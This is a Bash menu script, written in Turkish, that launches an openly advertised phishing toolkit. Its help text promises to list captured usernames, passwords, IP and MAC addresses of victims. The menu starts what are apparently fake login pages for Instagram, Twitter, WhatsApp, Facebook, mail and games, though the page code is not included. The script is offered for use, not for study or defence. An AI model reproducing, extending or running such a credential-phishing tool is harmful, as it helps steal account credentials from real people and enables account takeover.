#!/bin/bash
#!/bin/sh
#Code:Yaman Efkar
#Türk Siber Timi
#İnstagram : @turksibertimi
#Youtube : YamanEfkar
clear
case $1 in

      "--help")
	   sleep 1
       echo -e "
--help & --h   (Yardım Menüsünü Çağırır)
--ıp & --ip    (Giriş Yapmış Kişilerin Ip Adresini Listeler)
--user         (Giriş Yapılmış Username & Pass)
--mac          (Giriş Yapanların Mac Adresleri)
--location     (Belirtilen Ip Adresinin Yer Tespiti)
bash yaman.sh & sh yaman.sh (Phishing Toolu 'nu Çalıştırır)
   "
  ;;

     "--h")
	   sleep 1
       echo -e "
--help & --h   (Yardım Menüsünü Çağırır)
--ıp & --ip    (Giriş Yapmış Kişilerin Ip Adresini Listeler)
--user         (Giriş Yapılmış Username & Pass)
--mac          (Giriş Yapanların Mac Adresleri)
--location     (Belirtilen Ip Adresinin Yer Tespiti)
bash yaman.sh & sh yaman.sh (Phishing Toolu 'nu Çalıştırır)"

  ;;

esac

banner(){
echo -e '\033[31;40;1m 
	                                 ,----,                                                                                                    
                               ,/   .`|        ____                          ,--.                ,--,                                 ,--. 
    ,---,.    ,---,          ,`   .'  :      ,'  , `.   ,---,              ,--.'|              ,--.'|   ,---,         ,----..     ,--/  /| 
  ,'  .'  \  '  .' \       ;    ;     /   ,-+-,.' _ |  '  .' \         ,--,:  : |           ,--,  | :  '  .' \       /   /   \ ,---,': / ' 
,---.' .' | /  ;    '.   .'___,/    ,' ,-+-. ;   , || /  ;    '.    ,`--.'`|  ' :        ,---.'|  : ' /  ;    '.    |   :     ::   : '/ /  
|   |  |: |:  :       \  |    :     | ,--.'|'   |  ;|:  :       \   |   :  :  | |        |   | : _' |:  :       \   .   |  ;. /|   '   ,   
:   :  :  /:  |   /\   \ ;    |.';  ;|   |  ,', |  '::  |   /\   \  :   |   \ | :        :   : |.'  |:  |   /\   \  .   ; /--` '   |  /    
:   |    ; |  :  ' ;.   :`----'  |  ||   | /  | |  |||  :  ' ;.   : |   : '  '; |        |   ' '  ; :|  :  ' ;.   : ;   | ;    |   ;  ;    
|   :     \|  |  ;/  \   \   '   :  ;'   | :  | :  |,|  |  ;/  \   \'   ' ;.    ;        '   |  .'. ||  |  ;/  \   \|   : |    :   '   \   
|   |   . |'  :  | \  \ ,'   |   |  ';   . |  ; |--' '  :  | \  \ ,'|   | | \   |        |   | :  | ''  :  | \  \ ,'.   | '___ |   |    '  
'   :  '; ||  |  '  '--'     '   :  ||   : |  | ,    |  |  '  '--'  '   : |  ; .'        '   : |  : ;|  |  '  '--'  '   ; : .'|'   : |.  \ 
|   |  | ; |  :  :           ;   |.' |   : '  |/     |  :  :        |   | '`--'          |   | '  ,/ |  :  :        '   | '/  :|   | '_\.' 
|   :   /  |  | ,'           '---'   ;   | |`-'      |  | ,'        '   : |              ;   : ;--'  |  | ,'        |   :    / '   : |     
|   | ,'   `--''                     |   ;/          `--''          ;   |.'              |   ,/      `--''           \   \ .'  ;   |,'     
`----'                               '---'                          '---'                '---'                        `---`    '---'       
                                                                                                                                           

	   \e[35m☾★ ☾★ ☾★ ☾★ TÜRKİYE ☾★ ☾★ ☾★ ☾★	
	 \e[31m☾★ ☾★ ☾★ ☾★ BATMAN HACK TEAM ☾★ ☾★ ☾★ ☾★	
  \e[32m☾★ ☾★ ☾★ ☾★ İnstagram : @kapali01hesap24 ☾★ ☾★ ☾★ ☾★	
'
echo -e '
\e[31m[01]\e[32mİNSTAGRAM			\e[31m[04]\e[32mFACEBOOK
\e[31m[02]\e[32mTWİTTER			\e[31m[05]\e[32mMAİL
\e[31m[03]\e[32mWHATSAPP			\e[31m[06]\e[32mGAME (OYUNLAR)

\e[31m[00] KOD

\e[31m[99] ÇIKIŞ


'
read -p  "İŞLEM NUMARASI:" islem
}



banner
if [[ $islem == 1 || $islem == 01 ]]; then
	sleep 1
	clear
	cd Site/Instagram/
	bash start.sh

elif [[ $islem == 2 || $islem == 02 ]]; then
	sleep 1
	clear
	cd  Site/Twitter/
	bash start.sh

elif [[ $islem == 3 || $islem == 03 ]]; then
	sleep 1
	clear
	cd Site/Whatsapp/
	bash start.sh

elif [[ $islem == 4 || $islem == 04 ]]; then
	sleep 1
	clear
	cd  Site/Facebook/
	bash start.sh

elif [[ $islem == 5 || $islem == 05 ]]; then
	sleep 1
	clear
	cd  Site/Mail/
	bash start.sh

elif [[ $islem == 6 || $islem == 06 ]]; then
	sleep 1
	clear
	cd  Site/Game/
	bash start.sh
elif [[ $islem == 00 ]]; then

	cd Site/
	bash code.sh

elif [[ $islem == 99 ]]; then
	exit 1
else
	echo -e '\033[36;40;1m Lütfen Girdiğiniz İşlem Numarasını Kontrol Ediniz...'	
	sleep 1
	clear 
	banner
fi
